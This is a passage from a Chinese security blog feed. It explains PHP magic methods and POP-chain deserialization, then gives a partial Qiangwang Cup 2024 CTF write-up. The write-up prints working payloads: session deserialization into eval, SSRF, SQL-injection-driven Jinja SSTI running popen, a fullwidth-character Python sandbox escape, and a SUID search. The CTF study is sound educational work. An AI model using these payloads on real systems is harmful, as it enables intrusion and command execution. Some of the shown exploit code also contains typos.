<h3 id="invoke-是错误的将对象当成函数输出时触发"><a href="#invoke-是错误的将对象当成函数输出时触发" class="headerlink" title="__invoke()是错误的将对象当成函数输出时触发"></a>__invoke()是错误的将对象当成函数输出时触发</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class text&#123;</span><br><span class="line">    public $name=&quot;panpan&quot;;</span><br><span class="line">    function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;触发&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$p=new text;</span><br><span class="line">echo $p();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">触发</span><br></pre></td></tr></table></figure><br>可以看出当我们以函数的方式运行对象时触发invoke()。</p>
<h2 id="魔术方法错误调用"><a href="#魔术方法错误调用" class="headerlink" title="魔术方法错误调用"></a>魔术方法错误调用</h2><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p>call()在我们错误的调用一个对象中没有的方法时触发，其参数有两个，返回的值分别是不存在的魔术方法名和参数。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class text&#123;</span><br><span class="line">    public $name=&quot;panpan&quot;;</span><br><span class="line">    function __call($a,$b)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$a,$b[0]&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$p=new text();</span><br><span class="line">$p-&gt;calll(&#x27;ab&#x27;);</span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calll，ab</span><br></pre></td></tr></table></figure><br>我们可以看出输出的值为错误调用不存在的方法名calll和其参数ab。</p>
<h3 id="callstatic"><a href="#callstatic" class="headerlink" title="__callstatic()"></a>__callstatic()</h3><p>__callstatic()<br>触发时机：静态调用或调用成员常量时使用的方法不存在时触发<br>参数有两个<br>返回值为错误调用的方法和参数。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class text&#123;</span><br><span class="line">    public $name=&quot;panpan&quot;;</span><br><span class="line">    function __callstatic($a,$b)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$a,$b[0]&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$p=new text();</span><br><span class="line">$p::calll(&#x27;a&#x27;);</span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calll,a</span><br></pre></td></tr></table></figure></p>
<h3 id="get"><a href="#get" class="headerlink" title="_get()"></a>_get()</h3><p>触发时机：调用的成员属性不存在<br>参数：一个参数$a<br>返回值:不存在的成员属性名称<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>-&gt;benben;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benben</span><br></pre></td></tr></table></figure><br>通过输出我们可以看出来输出了不存在的成员变量名benben</p>
<h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><p>触发时机：当我们给一个不存在的成员属性赋值时触发__set()<br>参数：两个<br>返回值：不存在的成员属性名称和赋的值<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;panpan&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>,<span class="subst">$b</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;panpan=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panpan,1</span><br></pre></td></tr></table></figure></p>
<h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p>触发时机:对不可访问的属性（private或protected）或不存在的,使用isset()或empty()时,触发__isset()<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;panpan&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$name2</span>=<span class="string">&quot;dazhuang&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name3</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>();</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$p</span>-&gt;name);</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$p</span>-&gt;name2);</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$p</span>-&gt;name2);</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$p</span>-&gt;name3);</span><br><span class="line">    <span class="keyword">isset</span>(<span class="variable">$p</span>-&gt;xxxx);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name2</span><br><span class="line">name2</span><br><span class="line">name3</span><br><span class="line">xxxx</span><br></pre></td></tr></table></figure></p>
<h3 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h3><p>触发时机:对不可访问的属性使用usset()时触发<br>参数:一个<br>返回值:不存在的成员属性。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;panpan&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$name2</span>=<span class="string">&quot;dazhuang&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name3</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>();</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$p</span>-&gt;name);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$p</span>-&gt;name2);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$p</span>-&gt;name3);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$p</span>-&gt;xxxx);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name2</span><br><span class="line">name3</span><br><span class="line">xxxx</span><br></pre></td></tr></table></figure></p>
<h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><p>触发时机:当使用clone关键字老拷贝一个对象时触发，新对象会自动调用定义的魔术方法__clone<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">class text&#123;</span><br><span class="line">    public $name=&quot;panpan&quot;;</span><br><span class="line">    private $naem2=&quot;dazhuang&quot;;</span><br><span class="line">    function __clone()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;拷贝&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$p=new text();</span><br><span class="line">$haha=clone($p);</span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拷贝</span><br></pre></td></tr></table></figure></p>
<h1 id="pop链的构造"><a href="#pop链的构造" class="headerlink" title="pop链的构造"></a>pop链的构造</h1><p>pop链就是利用魔术方法，来链接其他方法，最终链接到可以利用漏洞的方法，实例如下<br><img src="/2023/11/25/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/pop1-1.png" class="" title="Alt text"><br>我们观察题目发现可以利用的函数为<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$value</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span></span><br></pre></td></tr></table></figure><br>在加上开头题目说flag is in flag.php那么我们就可以利用include包含flag.php之后就可以得到flag<br>在除了类的定义之外就只有一个反序列化函数所以我们要利用反序列化会触发的函数<strong>wakeup()来作为起点最终链接到<code>Modifier的append方法</code><br>我们可以将<code>$siurce</code>赋值为对象<code>show</code>在将<code>$str</code>赋值为对象<code>text</code>，因为当`</strong>wakeup()<code>触发时会输出</code>source<code>而输出时会因为错误的剑对象</code>show<code>当字符串输出触发</code>tosting<code>，又因为我们将</code>$str<code>赋值为对象</code>text<code>而</code>text<code>里没有</code>source<code>那么就会触发</code><strong>get()<code>。而</code></strong>get()<code>方法是返回一个函数</code>function（）<code>那么我们就可以将</code>$p<code>赋值为对象</code>Modifer<code>从而使</code>function<code>被赋值为对象</code>Modifier<code>，那么就会因错误的将对象当函数利用从而导致触发</code><strong>invoke()<code>，而</code></strong>invoke()<code>回调用</code>append()<code>方法,那么我们就可以将</code>value<code>赋值为</code>flag.php<code>从而输出</code>flag`<br>了解以上过程我们就可以开始构造pop链了代码如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$modifier</span>=<span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title class_">Tes</span>();</span><br><span class="line"><span class="variable">$text</span>-&gt;p=<span class="variable">$modifier</span>;</span><br><span class="line"><span class="variable">$show</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$show</span>-&gt;source=<span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str=<span class="variable">$text</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$show</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>因为在构造pop链时魔术方法并没有什么用所以我们可以只留下变量<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;r:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">13</span>:<span class="string">&quot;%00Modifier%00var&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><br>输出为以上序列化字符串</p>
]]></content>
      <categories>
        <category>php</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>强网2024 wp(部分)</title>
    <url>/2024/11/03/%E5%BC%BA%E7%BD%912024/</url>
    <content><![CDATA[<h1 id="周末打了个强网杯，累死了-感觉自己严重睡眠不足-简单写一下wp吧"><a href="#周末打了个强网杯，累死了-感觉自己严重睡眠不足-简单写一下wp吧" class="headerlink" title="周末打了个强网杯，累死了(感觉自己严重睡眠不足)简单写一下wp吧"></a>周末打了个强网杯，累死了(感觉自己严重睡眠不足)简单写一下wp吧</h1><h1 id="Xiaohuanxiong"><a href="#Xiaohuanxiong" class="headerlink" title="Xiaohuanxiong"></a>Xiaohuanxiong</h1><p>首先从install就可以看出其为开源宽架，我们从github上把源码扒下来。<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-201709952.png" class=""> </p>
<p>首先扫描目录<br>我们可以扫到admin路由和一堆奇奇怪怪的路由，既然admin路由发现为登陆框。<br>我们先看一下源码，会惊奇的发现，其好像都没有给后台做鉴权，那这这这不直接进后台了。</p>
<img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-205114660.png" class="">  
<p>输入/admin/Books会发现直接进入了后台。<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-205354946.png" class="">  </p>
<p>我们尝试加个账号发现添加成功，果然这后台是完全未授权的，然后可以在支付管理发现文件上传点<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-205609072.png" class="">  </p>
<p>看代码也可以指定其没有对文件进行任何处理<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-205623962.png" class=""><br>直接将文件写入到了payment.php下。<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-205755493.png" class=""><br>然后直接cat /flag<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210059413.png" class="">  </p>
<h1 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h1><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210149447.png" class="">  
<p>首先扫描一下目录可以在www.zip发现备份文件。然后进行代审<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210202848.png" class=""><br>查看登陆逻辑会发现其调用了$sessionManager-&gt;filterSensitiveFunctions();<br>步入看一下<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210211209.png" class=""><br>发现其会对我们的session文件进行应该黑名单检测，检测到的直接替换成空<br><code>private $sensitiveFunctions = [&#39;system&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;passthru&#39;, &#39;shell_exec&#39;, &#39;popen&#39;, &#39;proc_open&#39;];</code><br>那么这就有一个字符串逃逸的可能，我们可以构造字符串逃逸来修改我们的session文件，从而进行session反序列化。</p>
<p>我们先看一下如何生成反序列的payload<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210223955.png" class=""><br>我们可以看到其直接进入的eval那么久很好构造了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">notouchitsclass</span>(<span class="string">&quot;echo `ls -l /flag`;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">Payload为O:<span class="number">15</span>:<span class="string">&quot;notouchitsclass&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">19</span>: <span class="string">&quot;echo `ls -l /flag`;&quot;</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210337186.png" class="">  
<p> 查看session生成逻辑可以发现其先是将用户名存入session后随机生存1到50个字符组成的key，如何再将password存入。即生成的session如下<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210349397.png" class=""><br>那么因为我们可以控制usernam和password，那么我们只要使用system来触发waf，从而构造使得我们的payload逃逸，然后在dashboard触发反序列化即可。因为其生成的key大小是随机的所以我们可以用多个system然后进行条件竞争。来触发反序列化</p>
<p>Payload如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=systemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystem&amp;password=admin&quot;;aaa|O:15:&quot;notouchitsclass&quot;:1 :&#123;s:4:&quot;data&quot;;s:19: &quot;echo `ls -l /flag`;&quot;;&#125;</span><br></pre></td></tr></table></figure><br>而后再index.php发包再dashboard.php访问来触发session反序列化</p>
<img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210423377.png" class="">  
<p>触发后发现/flag不可读。执行/readflag后发现竟然得到了flag<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=systemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystem&amp;password=admin&quot;;aaa|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:17:&quot;echo+`/readflag`;&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210451649.png" class="">  
<h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><p>其实就是个Go语言写的一个代理造成的ssrf<br>说实话难度感觉很一般，比hgame的webvpn还低<br>首先我们可以发现/v1/api/flag其执行了readflag来进行获取flag<br>但是我们直接访问其是403，即我们没有权限，其猜测需要在本地访问。</p>
<p>于是我们看路由组 /v2，并添加了一个处理 POST 请求的 /api/proxy 路径<br>该路由会新建一个http请求，其请求方式和body都是由前面的结构体构造的<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210811158.png" class="">  </p>
<p>那么这不就存在SSRF吗。<br>使用如下payload就打出来了<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;POST&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">               <span class="attr">&quot;User-Agent&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MyCustomAgent&quot;</span></span><br><span class="line">           <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;follow_redirects&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">         <span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h1 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h1><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-211114565.png" class="">  
<p>进入后发现其是一个游戏，这时来看眼前端，几乎没有代码，于是我们猜测其需要扫描目录，使用常规字典发现扫不到于是使用脚本加关键词来生成字典<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键字列表</span></span><br><span class="line">keywords = [</span><br><span class="line">    <span class="string">&quot;snake&quot;</span>,</span><br><span class="line">    <span class="string">&quot;win&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;success&quot;</span>,</span><br><span class="line">    <span class="string">&quot;victory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;game&quot;</span>,</span><br><span class="line">    <span class="string">&quot;api&quot;</span>,</span><br><span class="line">    <span class="string">&quot;assets&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hidden&quot;</span>,</span><br><span class="line">    <span class="string">&quot;secret&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>,</span><br><span class="line">    <span class="string">&quot;score&quot;</span>,</span><br><span class="line">    <span class="string">&quot;leaderboard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;history&quot;</span>,</span><br><span class="line">    <span class="string">&quot;result&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backup&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成路径的组合</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_paths</span>(<span class="params">keywords</span>):</span><br><span class="line">    paths_dict = <span class="built_in">set</span>()  <span class="comment"># 使用 set 来避免重复路径</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):  <span class="comment"># 生成1到3个关键字的组合</span></span><br><span class="line">        <span class="keyword">for</span> combination <span class="keyword">in</span> product(keywords, repeat=length):</span><br><span class="line">            <span class="comment"># 使用 / 和 _ 拼接关键字</span></span><br><span class="line">            path_slash = <span class="string">&#x27;/&#x27;</span>.join(combination)  <span class="comment"># 使用 / 连接</span></span><br><span class="line">            path_underscore = <span class="string">&#x27;_&#x27;</span>.join(combination)  <span class="comment"># 使用 _ 连接</span></span><br><span class="line">            paths_dict.add(path_slash)  <span class="comment"># 添加到集合中</span></span><br><span class="line">            paths_dict.add(path_underscore)  <span class="comment"># 添加到集合中</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(paths_dict)  <span class="comment"># 返回排序后的路径列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    paths = generate_paths(keywords)</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">        <span class="built_in">print</span>(path)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>使用该字典爆破后发现一个405的路径。那么这个路径后端肯定有逻辑的嘛<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-211220473.png" class=""><br>但用GET访问后发现为500，即我们需要对参数进行fuzz。之后发现参数为username<img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-211232930.png" class=""><br>而且其还存储了时间，那么时间肯定是存在数据库里的，我们尝试进行sql注入。<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-211243993.png" class=""><br>可以发现其成功回显了3，但是sql注入不知道为什么跑不出来，于是想到了，既然我们可以操控其回显的time，那么有没有可能存在ssti呢?<br>于是进行尝试发现<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-211306633.png" class=""><br>存在ssti<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">snake_win?username=<span class="number">1</span><span class="string">&#x27; union select 1,2,&quot;&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;</span>popen<span class="string">&#x27;](&#x27;</span>cat /flag<span class="string">&#x27;).read()&#125;&#125;&quot;--</span></span><br></pre></td></tr></table></figure></p>
<img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-211343987.png" class="">  
<h1 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h1><p>看眼代码可以发现其基础逻辑就是获取json然后对json的文本进行一系列处理，然后将code塞入run.py运行<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-211834750.png" class=""> </p>
<p>我们查看其对text的处理，会发现其先检测了运行waf，然后使用unidecode.unidecode的进行解码，这就导致了一个问题，我们可以使用unidecode的字符来进行绕过，即 ()的中文（）在解码后就变为了英文的括号，即我们可以将输入的内容转为全角字符来绕过waf</p>
<img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-212031632.png" class="">  
<p>但仍然无法命令执行，这是以为其run.py里定义了一个hook函数，其会阻止我们触发长度大于4事件和黑名单事件，所以我们就只能尝试绕过hook。<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-212822358.png" class="">  </p>
<p>我们可以看到其并没有过滤sysem。但是system的长度超了</p>
<p>我们可以产生使用篡改内置函数来进行绕过。我们使用如下命令来将内置函数len的值赋值为0这样在运行len(xxx)时就为0即可以绕过长度限制，这样我们就可以命令执行了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;blocks&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;blocks&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;print&quot;</span>,</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;TEXT&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;block&quot;</span>: &#123;</span><br><span class="line">              <span class="string">&quot;type&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">              <span class="string">&quot;fields&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;TEXT&quot;</span>: <span class="string">&quot;’）；ｌｅｎ ＝ ｌａｍｂｄａ ｘ：０；＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（’‘）；＃&quot;</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-213435551.png" class="">  
<p>可以发现其需要提权<br>运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ｆｉｎｄ　／　－ｕｓｅｒ　ｒｏｏｔ　－ｐｅｒｍ　－４０００　－ｐｒｉｎｔ　２＞／ｄｅｖ／ｎｕｌｌ</span><br></pre></td></tr></table></figure>
<img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-213622447.png" class="">  
